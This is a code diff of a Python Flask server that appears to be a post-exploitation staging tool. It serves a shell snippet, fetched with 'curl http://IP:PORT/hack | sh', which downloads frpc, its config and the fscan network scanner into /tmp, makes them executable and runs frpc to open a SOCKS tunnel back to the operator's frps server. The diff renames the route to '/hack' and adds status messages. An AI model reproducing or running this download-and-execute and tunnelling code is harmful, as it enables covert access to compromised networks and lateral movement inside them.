@@ -32,7 +32,7 @@ FRPSNAME = str(uuid.uuid4()) + ".ini"
 PROXYPORT = get_free_port()
 FRPSPORT = get_free_port()
 
-@app.route('/', methods=['GET'])
+@app.route('/hack', methods=['GET'])
 def root():
     # curl http://1.1.1.1:12345/frpc -o /tmp/frpc && 
     # curl http://1.1.1.1:12345/27e9a19b-7a5d-4700-91d8-c98d247e8a30.ini -o /tmp/frpc.ini && 
@@ -46,12 +46,17 @@ def root():
     replace(RESOURCE_PATH + "frps.ini", CACHE_PATH + FRPSNAME, "{{frpsport}}", str(FRPSPORT))
 
     subprocess.Popen(RESOURCE_PATH + "frps -c " + CACHE_PATH + FRPSNAME + " &", shell=True)
-
-    code = '''curl http://{IP}:{PORT}/frpc -o /tmp/frpc && 
-    curl http://{IP}:{PORT}/frpcini -o /tmp/frpc.ini && 
-    curl http://{IP}:{PORT}/fscan -o /tmp/fscan && 
+    print("[+] frps running on {IP}:{FRPSPORT}".format(IP=IP, FRPSPORT=FRPSPORT))
+    
+    code = '''curl http://{IP}:{PORT}/frpc -o /tmp/frpc -s && 
+    echo "[+] frpc download completed"
+    curl http://{IP}:{PORT}/frpcini -o /tmp/frpc.ini -s && 
+    echo "[+] frpc.ini download completed"
+    curl http://{IP}:{PORT}/fscan -o /tmp/fscan -s && 
+    echo "[+] fscan download completed"
     chmod +x /tmp/frpc && chmod +x /tmp/fscan && 
     /tmp/frpc -c /tmp/frpc.ini & '''.format(IP=IP, PORT=PORT)
+    print("[+] proxy: socks {IP}:{PROXYPORT} admin password".format(IP=IP, PROXYPORT=PROXYPORT))
     return code
 
 @app.route('/frpc', methods=['GET'])
@@ -84,6 +89,6 @@ if __name__ == "__main__":
     os.popen("chmod -R 777 .")
     IP = sys.argv[1]
     PORT = sys.argv[2]
-    print("[+] curl http://{}:{} | sh".format(IP, PORT))
+    print("[+] curl http://{}:{}/hack | sh".format(IP, PORT))
     app.run(host="0.0.0.0", port=PORT)
     
